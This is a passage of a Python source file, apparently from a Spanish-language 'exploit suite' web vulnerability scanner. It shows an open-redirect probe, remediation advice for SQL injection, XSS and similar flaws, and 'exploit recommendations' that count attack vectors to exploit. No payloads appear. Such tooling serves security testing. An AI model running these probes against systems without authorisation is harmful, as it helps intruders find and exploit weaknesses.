            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(malicious_url)}"
            
            async with self.session.get(test_url, allow_redirects=False) as response:
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    return malicious_url in location
            
            return False
            
        except Exception:
            return False
    
    def generate_security_recommendations(self, vulnerabilities: Dict[str, Any]) -> List[str]:
        """Generar recomendaciones de seguridad"""
        recommendations = []
        
        for vuln_type, vuln_data in vulnerabilities.items():
            if isinstance(vuln_data, dict) and vuln_data.get('vulnerable', False):
                if vuln_type == 'sql_injection':
                    recommendations.append("Implementar consultas parametrizadas y validaciÃ³n de entrada")
                elif vuln_type == 'xss':
                    recommendations.append("Implementar validaciÃ³n y codificaciÃ³n de salida HTML")
                elif vuln_type == 'lfi':
                    recommendations.append("Validar y filtrar rutas de archivos")
                elif vuln_type == 'command_injection':
                    recommendations.append("Evitar ejecuciÃ³n de comandos del sistema con entrada de usuario")
                elif vuln_type == 'xxe':
                    recommendations.append("Deshabilitar entidades externas en parsers XML")
                elif vuln_type == 'auth_bypass':
                    recommendations.append("Implementar autenticaciÃ³n robusta y validaciÃ³n de sesiones")
                elif vuln_type == 'csrf':
                    recommendations.append("Implementar tokens CSRF en todos los formularios")
                elif vuln_type == 'file_upload':
                    recommendations.append("Validar tipos de archivo y ubicaciones de subida")
                elif vuln_type == 'open_redirect':
                    recommendations.append("Validar URLs de redirecciÃ³n contra lista blanca")
        
        if not recommendations:
            recommendations.append("No se encontraron vulnerabilidades crÃ­ticas")
        
        return recommendations
    
    def generate_exploit_recommendations(self, vulnerability_scan: Dict[str, Any]) -> List[str]:
        """Generar recomendaciones especÃ­ficas de exploits"""
        exploit_recommendations = []
        
        vulnerabilities = vulnerability_scan.get('vulnerabilities', {})
        risk_score = vulnerability_scan.get('risk_score', 0)
        
        if risk_score > 80:
            exploit_recommendations.append("ðŸ”´ CRÃTICO: MÃºltiples vulnerabilidades detectadas - Requiere atenciÃ³n inmediata")
        elif risk_score > 50:
            exploit_recommendations.append("ðŸŸ¡ ALTO: Vulnerabilidades significativas encontradas")
        else:
            exploit_recommendations.append("ðŸŸ¢ BAJO: Pocas vulnerabilidades detectadas")
        
        # Recomendaciones especÃ­ficas por tipo
        for vuln_type, vuln_data in vulnerabilities.items():
            if isinstance(vuln_data, dict) and vuln_data.get('vulnerable', False):
                findings = vuln_data.get('findings', [])
                if findings:
                    exploit_recommendations.append(f"Explotar {vuln_type}: {len(findings)} vectores de ataque encontrados")
        
        return exploit_recommendations
    
    async def close(self):
        """Cerrar conexiones"""
        if self.session:
            await self.session.close()

# Instancia global
exploit_suite_service = ExploitSuiteService()
